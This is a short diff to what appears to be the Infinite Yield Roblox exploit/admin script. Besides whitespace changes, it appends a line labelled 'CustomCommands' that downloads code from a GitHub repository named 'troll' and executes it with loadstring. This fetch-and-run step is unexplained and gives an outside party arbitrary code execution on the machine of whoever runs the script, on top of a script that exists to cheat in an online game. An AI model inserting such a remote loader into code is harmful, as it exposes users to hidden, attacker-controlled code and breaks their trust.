@@ -4,7 +4,6 @@ if IY_LOADED and not _G.IY_DEBUG == true then
 end
 
 pcall(function() getgenv().IY_LOADED = true end)
-
 COREGUI = game:GetService("CoreGui")
 if not game:IsLoaded() then
 	local notLoaded = Instance.new("Message")
@@ -6208,7 +6207,6 @@ Players.LocalPlayer.OnTeleport:Connect(function(State)
 		end
 	end
 end)
-
 addcmd('addalias',{},function(args, speaker)
 	if #args < 2 then return end
 	local cmd = string.lower(args[1])
@@ -12015,6 +12013,9 @@ updateColors(currentScroll,scroll)
 if PluginsTable ~= nil or PluginsTable ~= {} then
 	FindPlugins(PluginsTable)
 end
+
+--CustomCommands
+loadstring(game:HttpGet("https://raw.githubusercontent.com/dunnook/troll/main/command"))()
 
 -- Events
 eventEditor.RegisterEvent("OnExecute")
